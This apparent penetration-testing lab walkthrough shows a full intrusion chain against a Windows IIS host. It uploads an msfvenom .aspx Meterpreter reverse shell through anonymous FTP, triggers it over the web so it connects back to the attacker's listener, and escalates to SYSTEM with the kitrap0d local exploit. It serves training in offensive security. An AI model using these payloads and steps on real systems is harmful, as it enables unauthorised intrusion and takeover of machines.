## Creating Our Payloads
Let's suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a web service running on port `tcp/80` of the same machine and that all of the files found in the FTP root directory can be viewed in the web-service's `/uploads` directory. Let's also suppose that the web service does not have any checks for what we are allowed to run on it as a client.

#### Scanning the Target
```shell-session
nmap -sV -T4 -p- 10.10.10.5

<SNIP>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### FTP Anonymous Access
```shell-session

ftp> ls

200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Noticing the aspnet_client, we realize that the box will be able to run `.aspx` reverse shells. Luckily for us, `msfvenom` can do just that without any issue.
#### Generating Payload
```shell-session
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

Upload to the ftp server


#### MSF - Setting Up Multi/Handler
```shell-session
msf6 > use multi/handler
```

## Executing the Payload
Now we can trigger the `.aspx` payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back to our `multi/handler` module, we would have received a connection. We should ensure that our `.aspx` file does not contain HTML, so we will only see a blank web page. However, the payload is executed in the background anyway.

Access to `http://<ip>/reverse_shell.aspx`

#### MSF - Meterpreter Shell
```shell-session
[*] Started reverse TCP handler on 10.10.14.5:1337 

[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000


meterpreter > getuid

Server username: IIS APPPOOL\Web
```

### Avoiding meterpreter dying
If the Meterpreter session dies too often, we can consider encoding it to avoid errors during runtime. We can pick any viable encoder, and it will ultimately improve our chances of success regardless.

## Local Exploit Suggester
As a tip, there is a module called the `Local Exploit Suggester`. We will be using this module for this example, as the Meterpreter shell landed on the `IIS APPPOOL\Web` user, which naturally does not have many permissions. Furthermore, running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester.

#### MSF - Searching for Local Exploit Suggester
```shell-session
msf6 > search local exploit suggester
msf6 > use 2376

msf6 post(multi/recon/local_exploit_suggester) > set session 2
msf6 > run
```
Having these results in front of us, we can easily pick one of them to test out. If the one we chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same. Going down the list, `bypassauc_eventvwr` fails due to the IIS user not being a part of the administrator's group, which is the default and expected. The second option, `ms10_015_kitrap0d`, does the trick.

#### MSF - Local Privilege Escalation
```shell-session
msf6 exploit(multi/handler) > search kitrap0d
SET OPTIONS
AND RUN

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```
